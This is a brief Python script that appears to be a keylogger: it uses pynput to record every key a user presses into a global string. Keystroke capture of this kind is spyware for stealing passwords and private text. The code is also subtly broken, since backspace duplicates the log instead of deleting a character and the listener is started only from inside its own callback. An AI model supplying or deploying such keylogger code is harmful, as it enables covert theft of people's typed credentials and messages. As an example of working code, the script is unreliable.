from pynput import keyboard

log = ''

def processkeys(key):
        global log

        try:
                log += key.char
        except AttributeError:
                match key:
                        case keyboard.Key.space:
                                log += ' '
                        case keyboard.Key.enter:
                                log += '\n'
                        case keyboard.Key.backspace:
                                log += log[:-1]
                        case _:
                                log += ''

        keyboard_listener = keyboard.Listener(on_press=processkeys)
        keyboard_listener.start()
        keyboard_listener.join()